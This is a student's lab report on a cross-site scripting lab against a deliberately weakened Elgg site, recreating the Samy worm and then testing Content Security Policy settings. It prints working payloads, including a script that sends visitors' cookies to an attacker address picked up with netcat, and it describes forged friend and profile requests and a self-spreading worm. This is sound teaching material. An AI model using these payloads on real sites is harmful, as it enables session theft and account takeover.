# Cross-Site-Scripting-XSS

Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability
makes it possible for attackers to inject malicious code (e.g. JavaScript programs) into victim’s web browser.
Using this malicious code, attackers can steal a victim’s credentials, such as session cookies. The access
control policies (i.e., the same origin policy) employed by browsers to protect those credentials can be
bypassed by exploiting XSS vulnerabilities.
To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named Elgg in our pre-built Ubuntu VM image. Elgg is a very popular open-source web application
for social network, and it has implemented a number of countermeasures to remedy the XSS threat. To
demonstrate how XSS attacks work, we have commented out these countermeasures in Elgg in our installation, intentionally making Elgg vulnerable to XSS attacks. Without the countermeasures, users can post any
arbitrary message, including JavaScript programs, to the user profiles.
In this lab, students need to exploit this vulnerability to launch an XSS attack on the modified Elgg, in a
way that is similar to what Samy Kamkar did to MySpace in 2005 through the notorious Samy worm. The
ultimate goal of this attack is to spread an XSS worm among the users, such that whoever views an infected
user profile will be infected, and whoever is infected will add you (i.e., the attacker) to his/her friend list.

This lab covers the following topics:
* Cross-Site Scripting attack
* XSS worm and self-propagation
* Session cookies
* HTTP GET and POST requests
* JavaScript and Ajax
* Content Security Policy (CSP) 



# Lab Environment Setup

<img src= "https://user-images.githubusercontent.com/77298953/210926756-1ec6a02b-26e5-4495-a6a7-812f66e0d49c.PNG" width=70% height=70%>


The image above shows the lab environment setup by adding the DNS configurations and the websites

relating to the ip addresses in the /etc/hosts file using the command “sudo nano /etc/hosts”. Along with

this the commands “docker-compose build” and “docker-compose up” were used to start the Elgg

container. With all of this setup, all of the websites were running properly and could be visited.


# Task 1

<img src= "https://user-images.githubusercontent.com/77298953/210926811-d7f6678f-73e7-4120-9846-36b858adf35d.PNG" width=70% height=70%>

<img src= "https://user-images.githubusercontent.com/77298953/210926856-1aaec324-a441-46ae-bc73-7e1614d5371d.PNG" width=70% height=70%>



#Task 1 Explanation
For task 1, we were tasked with embedding a JavaScript program into a Elgg profile so

when another user views the profile the script will be executed. We were provided with the code:

<script<alert(‘XSS’);</script> and this was used to create the alert. This segment of code was

placed in the brief description section of Alice’s profile. The first image shows the code being

placed in the “brief description” section and the second image shows the result of when the code

is executed. The second image shows an alert box popping up when Alice’s profile is being

visited.


# Task 2

<img src= "https://user-images.githubusercontent.com/77298953/210927000-ce50b1a4-1306-47fc-9c94-72744cb1e62d.PNG" width=70% height=70%>

The image above shows the script that was added to the “about me” section of Alice’s profile

<img src= "https://user-images.githubusercontent.com/77298953/210927035-90c27acb-6634-4f2d-8482-645557a11403.PNG" width=70% height=70%>

The image above shows the cookies of Alice’s profile when she is viewing her own account

<img src= "https://user-images.githubusercontent.com/77298953/210927078-00f0db15-a75f-4f7c-a98f-f3c99c106e6c.PNG" width=70% height=70%>

The image above shows the cookies of Samy’s profile when viewing Alice’s profile


## Task 2 Explanation
In task 2, the objective was to embed a JavaScript program in Alice’s profile to display the

cookies of the person visiting her profile. The cookies will be displayed in an alert pop up

window and it was achieved by adding the following code:

<script>alert(document.cookie);</script> into the “About me” section of Alice’s profile. The

images above show what the code displays when Alice’s account is viewed from another

account. In the instance above, Alice’s account was viewed from Samy’s profile which revealed

Samy’s cookies.


# Task 3

<img src= "https://user-images.githubusercontent.com/77298953/210927265-6df8cd9f-7cef-4526-ac61-614b9abdbbdd.PNG" width=70% height=70%>

The image above shows the code that was added to Alice’s profile in the “About Me” section

<img src= "https://user-images.githubusercontent.com/77298953/210927294-d6c9c117-54a1-49c3-9d8a-99f614ba137a.PNG" width=70% height=70%>

The image above shows how Alice’s profile looks when the code is embedded in her profile

<img src= "https://user-images.githubusercontent.com/77298953/210927319-12eefad7-7607-498d-9a53-d7a7db9552b1.PNG" width=70% height=70%>

The image above shows the results of running “nc -lknv 5555” in the terminal and this displayed

Samy’s cookies when he visited Alice’s profile


## Task 3 Explanation

In task 3 the objective was to steal cookies from the victim’s machine, the victim being the

user visiting Alice’s account. In previous tasks, the malicious JavaScript code the cookies would

be printed out and only the user can see the cookies, not the attacker. In this task, the cookies

were sent to the attacker and in order to achieve this, the code was inserted into a <img> tag. The

<img> tag was used since when a browser tries to load the image, a HTTP GET request will be

sent to the attacker’s machine on the port 5555. The code: <script>document.write(‘<img src =

[http://10.9.0.1:5555?c=](http://10.9.0.1:5555/?c=)[’](http://10.9.0.1:5555/?c=)[ ](http://10.9.0.1:5555/?c=)[+](http://10.9.0.1:5555/?c=)[ ](http://10.9.0.1:5555/?c=)escape(document.cookie) + ‘ >’); was put in the “About Me” section

of Alice’s profile. This code sent the cookies over the port 5555 to the attacker’s machine which

has the ip address of 10.9.0.1. Once this was done, the netcat program had to be used in terminal

so that the 5555 port can be listened to for incoming connections. The result of running this

command “nc -lknv 5555” printed the Elgg cookies of the user visiting Alice’s website which in

the image above is Samy.


# Task 4
 
<img src= "https://user-images.githubusercontent.com/77298953/210927456-c40acfed-b48b-4f07-9d0a-e426c17d3f3f.PNG" width=70% height=70%>

The image above shows the JavaScript code that was added to Samy’s profile
 
<img src= "https://user-images.githubusercontent.com/77298953/210927493-41081dba-ea9d-486e-aff6-4331871775d2.PNG" width=70% height=70%>
 
The image above shows that Alice is now friends with Samy just by visiting his page


 ## Task 4 Explanation
 
In this task the objective was to become a victim’s friend through the use of JavaScript

code. This was meant to mimic the Samy worm that occurred in 2005 but in this task, it was not

self-propagating yet. In this task the JavScript program would forge a HTTP request directly

from the victim’s browser without the intervention of the attacker. The first screenshot shows the

code that was added into the “About Me” section of Samy’s profile. This was done by enabling

Text Mode since the default Editor Mode adds extra HTML code to the text typed. In the code,

the url specified wa[s](http://www.seed-server.com/action/friends/add)[ ](http://www.seed-server.com/action/friends/add)<http://www.seed-server.com/action/friends/add>[ ](http://www.seed-server.com/action/friends/add)+ “?friend=59” + token + ts

and this forged a HTTP request. Samys user id (guid) had to be specified in the code in order for

the attack to work. The variables ts and token were added in order to correctly forge a request

since these are needed to be considered correct requests due to countermeasures. Once all of this

was done, when a user visited Samy’s profile, they would automatically be added as his friend

which is evident in the second picture where Alice visited Samy’s page.
 

## Question 1: Explain the purpose of Lines CD and @, why are they are needed?
 

Answer : Lines CD and @ are needed because they serve the purpose of getting the values for \_\_elgg\_ts and

\_\_elgg\_token. These two parameters are needed because without them a HTTP request cannot be forged

since they are expected. These two parameters serve as a security measure to prevent CSRF attacks, as

explored in the pervious lab. These two values are uniquely generated and change for each user which

makes it difficult to forge requests and secures the elgg website. In essence, these two lines are needed in

order to make a correct HTTP request and are added to the end of the url so Samy can carry out his attack

successfully.
 

## Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

 
Answer: If the Elgg application would only provide Editor Mode for the “About Me” field and did not let

user’s to switch to Text Mode, the attack cannot be launched successfully. This attack would not be able

to be launched successfully because as mentioned in the task, extra HTML code is added to what would

be typed. This extra added code can hinder our attack by adding unnecessary symbols and characters that

can prevent the code from executing properly. Due to this reason, Text Mode is needed to launch this

attack properly.


# Task 5
 
<img src= "https://user-images.githubusercontent.com/77298953/210927889-3067fb2b-92a3-47eb-ac62-ba4ee662879d.PNG" width=70% height=70%>

The image above shows the JavaScript code that was added in order to achieve the task

<img src= "https://user-images.githubusercontent.com/77298953/210927942-8207bf76-7380-4e2e-a9bc-df2ddbfdded5.PNG" width=70% height=70%>

The image above shows that Alice’s “About Me” section was changed as a result of viewing Samys page


## Task 5 Explanation
In this task the objective was to modify the victim’s profile when Samy’s page is visited. In order to

achieve this, JavaScript code was added that will be executed when the victim visits Samy’s profile. The

JavaScript code forges a HTTP POST request that modifies the victim’s user profile. The task provided us

with a skeleton code that I added to in order to complete this task. As seen in the first screen shot above,

the malicious code was added into the “About Me” section of Samy’s profile in Text Mode. The code

consisted of initial variables such as the username of the person visiting the page, the user id of the

victim, Samy’s user id, \_\_elgg\_ts, \_\_elgg\_token as well as a url that would be sent. The url was

<http://www.seed-server.com/action/profile/edit>[ ](http://www.seed-server.com/action/profile/edit)and added to this url was “token + ts + username + desc +

guid”. All of this information made a valid HTTP request that would modify the victim’s user profile. The

desc variable was set to “Samy is my hero” which can be seen in the second screenshot where that is

Alice’s profile description. All of this code is executed when a user visits Samy’s profile and allows the

victims profile to be edited.
 

## Question 3: Why do we need Line CD? Remove this line, and repeat your attack. Report and explain your observation?

Answer : Line CD in the JavaScript code checks if the guid of the user is not Samy’s guid and if it is not, it

executes more code. If this line of code was not included, then the request would be sent out even if Samy

viewed his own profile. When removing this line of code, Samy’s profile is edited and the message

“Samy is my hero” is displayed in the “About Me” section. This line of code serves as a precaution so

that the code does not edit his own profile but the profiles of others and this can only be determined by

getting their guid’s.


# Task 6
 
<img src= "https://user-images.githubusercontent.com/77298953/210928218-7d54d91d-abd2-4fac-b424-235aad365bd7.PNG" width=70% height=70%>

The image above shows the JavaScript code that was put in Samy’s account

<img src= "https://user-images.githubusercontent.com/77298953/210928246-1c7e53f8-52e6-472b-a998-8acbfe9995dd.PNG" width=70% height=70%>

The image above shows that Alice’s account was infected
 
<img src= "https://user-images.githubusercontent.com/77298953/210928277-64940758-7370-4d03-80a2-0f3e9448f557.PNG" width=70% height=70%>

The image above shows that Charlies account was infected
 
<img src= "https://user-images.githubusercontent.com/77298953/210928298-6e0d3bb5-643f-4244-b343-2bf1bacc06f6.PNG" width=70% height=70%>

The image above shows that the code was put into Boby’s account after being infected with the worm


## Task 6 Explanation  
 
In task 6 the objective was to create the self-propagating worm so that when a user visits an infected

profile their profile is modified and then anyone who views infected profiles will become infected. This

attack can be carried out through a link approach or a DOM approach and for this task it was done using

the DOM approach. In order to complete the objective, an entire JavaScript program was embedded in the

Samy’s profile. This utilized the DOM API to retrieve a copy of itself from the web page, making the

worm work as intended. The JavaScript code used a URL encoding function that URL-encodes a string

that includes the header tag, JavaScript code and well as the tail tag. Information that was used in the

previous tasks such as user name, user guid, \_\_elgg\_ts, \_\_elgg\_token, description, content, Samy’s guid

and url was all needed to carry out this attack. The link used was [http://www.seed-](http://www.seed-server.com/action/profile/edit)

[server.com/action/profile/edit](http://www.seed-server.com/action/profile/edit)[ ](http://www.seed-server.com/action/profile/edit)and all of this information was used to create and send a request to modify

a user’s profile. What made this code self-propagating was that once the code ran, it was added to the

victim’s profile and would be transferred to another user when they got infected. A person that was

infected would have the words “Worm is spreading” in their profile indicating they have been infected.


# Task 7

## Question 1: Describe and explain your observations when you visit these websites.

Answer : When visiting the three websites, each website displayed the status for various aspects of the CSP

experiments that were labeled areas 1 – 6. In the first website: [www.example32a.com](http://www.example32a.com/)[,](http://www.example32a.com/)[ ](http://www.example32a.com/)the status of each

area was “OK” which signaled that the JavaScript code for each area executed correctly. In contrast, when

visiting the second website, [www.example32b.com](http://www.example32b.com/)[ ](http://www.example32b.com/)the results were different from the first website. The

JavaScript code was not executed properly in this website since the status for areas 1,2,3 and 5 were

“Failed” while areas 4 and 6 had the status “OK”. This indicates that there are issues with the JavaScript

code and was not functioning properly. Lastly, in website thre[e,](http://www.example32c.com/)[ ](http://www.example32c.com/)[www.example32c.com](http://www.example32c.com/)[,](http://www.example32c.com/)[ ](http://www.example32c.com/)[t](http://www.example32c.com/)here were issues

with areas 2,3 and 5 since they had the “Failed” status while areas 1,4 and 6 had the “OK” status.


## Question 2: Click the button in the web pages from all the three websites, describe and explain your observations.

Answer : When visiting the first websit[e,](http://www.example32a.com/)[ ](http://www.example32a.com/)[www.example32a.com](http://www.example32a.com/)[,](http://www.example32a.com/)[ ](http://www.example32a.com/)and clicking the button at the bottom of

the page an alert pops up on the window with the text “JS Code executed!”. In contrast, when clicking

the button for the second and third websit[e,](http://www.example32b.com/)[ ](http://www.example32b.com/)[www.example32b.com](http://www.example32b.com/)[ ](http://www.example32b.com/)and [www.example32c.com](http://www.example32c.com/)[ ](http://www.example32c.com/)nothing

happened. No alert box showed up and there were no changes shown. A possible explanation as to why

the websites did not change when the buttons were clicked is because the JavaScript code was not

executing properly as is evident by the “Failed” status in multiple areas present on both websites. The

first website had the “OK” status on all areas meaning the JavaScript code executed properly so an alert

was shown. Since the code was not executing properly in the second and third websites, no changes

occurred when the buttons were clicked.

## Question 3: Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.
 

Answer : Areas 5 and 6 now display the status “OK” after altering the Apache configuration. In the

configuration I added “ ‘nonce-111-111-111’ ‘nonce-222-222-222’ \\*.example60.com”. This addition

fixed areas 1,2,5 and 6 because after restarting the Apache service, these areas were now included in

the header. In the original Apache file, the two nonces were not included and the website,

[www.example60.com](http://www.example60.com/)[,](http://www.example60.com/)[ ](http://www.example60.com/)[w](http://www.example60.com/)as not included so it would not execute correctly.


## Question 4: Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.

 
Answer: After editing the phpindex.php file by adding “ ’nonce-222-222-222’ \*.example60.com” areas 2 and

5 showed the “OK” status. This is because the nonce and website were now specified in the header

whereas previously it was not specified so the status was “Failed”. Areas 1,4 and 6 had the status “OK”

and were in the header so those did not need to be fixed.

 
## Question 5: Please explain why CSP can help prevent Cross-Site Scripting attacks.

 
Answer : CSP stands for Content Security Policy and this is a computer security standard that was introduced

to prevent cross-site scripting attacks. CSP can be used to prevent cross-site scripting attacks because of

the features it provides and extra security. CSP restricts the resources (ex. Scripts and images) that a

page can load which prevents cross-site scripting attacks. In order to enable CSP, a response must be

included in a HTTP response header labeled “Content-Security-Policy” and this must have a value

containing the policy. A nonce (random value) can be specified by the CSP directive and the same value

must be used in the tag that loads a script in order to execute. If the values do not match, the script will

not be executed, which makes it difficult for an attacker to guess this value since each page has a

randomly generated nonce. Moreover, a hash can be specified for a trusted script and if the hash of a

script does not match the value of the hash provided in the directive, it will not execute. CSP is used to

prevent scripts from executing by adding an extra layer of security through the use of additional header

requirements. These requirements deter attackers since it is difficult forge valid requests.

